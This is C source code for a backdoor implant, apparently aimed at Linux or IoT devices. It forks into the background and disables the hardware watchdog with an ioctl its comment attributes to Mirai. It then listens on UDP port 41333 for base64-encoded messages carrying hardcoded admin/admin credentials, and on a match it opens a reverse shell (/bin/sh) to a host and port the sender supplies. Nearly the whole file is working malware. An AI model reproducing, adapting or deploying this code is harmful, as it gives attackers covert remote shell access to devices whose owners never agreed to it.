#include <arpa/inet.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include "x41.h"

#define PASS "admin"
#define USER "admin"

pid_t pid_door;
pthread_t wait_t;

char enc[BASE64_BUF]; // for encode in base64 buffor 
char dec[BASE64_BUF]; // for decode in base64 buffor

static int decode_base64_to_6bit(int c)
{
  if (c >= 'A' && c <= 'Z') {
    return c - 'A';
  } else if (c >= 'a' && c <= 'z') {
    return c - 'a' + 26;
  } else if (c >= '0' && c <= '9') {
    return c - '0' + 52;
  } else if (c == '+') {
    return 62;
  } else if (c == '/') {
    return 63;
  } else if (c == '=') {
    return 0;
  } else {
	return -1;
  }
}
 
static void *decode_base64(char *src)
{
  unsigned int o[4];
  char *p = dec;
  size_t i;
 
  for (i = 0; src[i]; i += 4) {
	if(decode_base64_to_6bit(src[i]) < 0) return NULL;
    o[0] = decode_base64_to_6bit(src[i]);
    o[1] = decode_base64_to_6bit(src[i + 1]);
    o[2] = decode_base64_to_6bit(src[i + 2]);
    o[3] = decode_base64_to_6bit(src[i + 3]);
 
    *p++ = (o[0] << 2) | ((o[1] & 0x30) >> 4);
    *p++ = ((o[1] & 0xf) << 4) | ((o[2] & 0x3c) >> 2);
    *p++ = ((o[2] & 0x3) << 6) | (o[3] & 0x3f);
  }
 
  *p = '\0';
  return dec;
}
 
static void revStr(char* str){
    int size = strlen(str);
    int i,j;
    char tmp = {0};
    
    for(i=0, j=size - 1; i<size / 2; i++, j--){
        tmp = str[i];
        str[i] = str[j];
        str[j] = tmp;
    }
    return;    
}


static int tag_format(char* r_xml_item, char* id, char* resolve){
	// start_tag is tag name in first position
	char *start_tag = (char*)malloc(sizeof(char) * (strlen(id) + 16));
	// end_tag is tag name in end position
	char *end_tag = (char*)malloc(sizeof(char) * (strlen(id) + 16));
	// r is copy buf in body
	char *r= (char*)malloc(sizeof(char) * strlen(r_xml_item) + 32);
	int end_tag_len;
	int start_tag_len;
	char *str_str;
	
	if(start_tag == NULL && end_tag ==NULL && r == NULL) return -3;
	
	// to copy
	sprintf(r, "%s", r_xml_item);
	// create in first tag 
	sprintf(start_tag, "<%s>",id);
	// create in end tag 
	sprintf(end_tag, "</%s>",id);
	revStr(end_tag);
	
	end_tag_len = strlen(end_tag);
	start_tag_len = strlen(start_tag);
	
	// reverse the string
	revStr(r);
	// get in end_tag to string valus
	str_str = strstr(r, end_tag);
	free(end_tag);
	if(str_str != NULL){
		sprintf(r,"%s", &str_str[end_tag_len]);
	}else{
		free(start_tag);
		free(r);
		return -1;
	}
	
	// once again reverse the string to 
	revStr(r);
	// get in first_tag to string valus 
	str_str = strstr(r, start_tag);
	free(start_tag);
	if(str_str != NULL){
		sprintf(r, "%s", &str_str[start_tag_len]);
		sprintf(resolve, "%s", r);
		free(r);
	}else{
		free(r);
		return -2;
	}
	
	return 0;
}


// the following algorrithm provides a reverse shell 
static int door(char *rhost, int rport){
	struct sockaddr_in Door;
	int door_sock;
	
	// execution in command
	char *argv[] = {"/bin/sh", NULL};
	
	door_sock = socket(AF_INET, SOCK_STREAM, 0);
	if(door_sock < 0) exit(42);
	
	Door.sin_family =AF_INET;
	Door.sin_port = htons(rport);
	Door.sin_addr.s_addr = inet_addr(rhost);
	
	if(connect(door_sock,(struct sockaddr * )&Door, sizeof(struct sockaddr)) < 0){
		close(door_sock);
		exit(42);		
	}else{
		dup2(door_sock, 0);
		dup2(door_sock, 1);
		dup2(door_sock, 2);
		execve(argv[0], argv, NULL);
		exit(42);
	}
}

static void *waitng(){
	int status;
	// if the process terminates 
	pid_door = wait(&status);
	return 0;
}

static void door_session(short session_port){	
	char buf[MESSAGE_BUF];		// for raw data
	char valus[MESSAGE_BUF];	// for decode data
	char *decode_body;          // 
	char *pass = PASS;			// authentication password 
	char *user = USER;			// authentication username
	char set_pass[SETUSER_BUF];	// confirmation buffer in password
	char set_user[SETUSER_BUF];	// confirmation buffer in username
	char host[DSTHOST_BUF];		// dst host in buffer
	char port[DSTPORT_BUF];		// dst port in buffer
	short port_s;				// dst_char_port to dst_short_port
	
	struct sockaddr_in addr;
	struct sockaddr_in senderinfo;
	socklen_t size;
	int socket_udp; 
	
	socket_udp = socket(AF_INET, SOCK_DGRAM, 0);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(session_port);
	addr.sin_addr.s_addr = INADDR_ANY;
		
	bind(socket_udp, (struct sockaddr *)&addr, sizeof(addr));
	while(1){
		size = sizeof(senderinfo);
		recvfrom(socket_udp, buf, sizeof(buf) - 1, 0,
				(struct sockaddr *)&senderinfo, &size);
		// retun response

		sendto(socket_udp, buf, strlen(buf),
				0, (struct sockaddr *)&senderinfo, size);
		memset(buf, 0 ,sizeof(buf));
		// encode data to decode
		decode_body = decode_base64(buf);
			
		// check in base64 format for buffer text
		if(decode_body != NULL){
			// check in authentication infomation 
			if(tag_format(decode_body, "DOOR",valus) == 0
					&& tag_format(valus, "PASS", set_pass) == 0 
					&& tag_format(valus, "USER", set_user) == 0 
					&& strcmp(pass,set_pass) == 0 
					&& strcmp(user, set_user) == 0 
					&& tag_format(valus ,"HOST", host) == 0 
					&& tag_format(valus, "PORT", port) == 0 
					&& sscanf(port, "%hd", &port_s) == 1){
				//generate fork
				pid_door = fork();
				switch(pid_door){
					case 0:
						// run to with if correct authentication info
						door(host, port_s);
				}
				pthread_create(&wait_t, NULL, waitng, NULL);	
			}
		}
	};
	return;
}

int main(){
	int wfd;
	short session_port = 41333;  // session port
	// generate fork
	pid_t pid_d;
	pid_d = fork();
	
	// watchdog invalid 
	// by MIRAI
	if((wfd = open("/dev/watchdog", 2)) != -1 ||
        (wfd = open("/dev/misc/watchdog", 2)) != -1){
        int one = 1;
		// HeartBeat 0x80045704 & 0x80045705
        ioctl(wfd, 0x80045704, &one);
        close(wfd);
        wfd = 0;
    };

	switch(pid_d){
		case 0:
			// if there is no proble, whih the fork run
			door_session(session_port);
			return 0;
	}
	return 0;
}

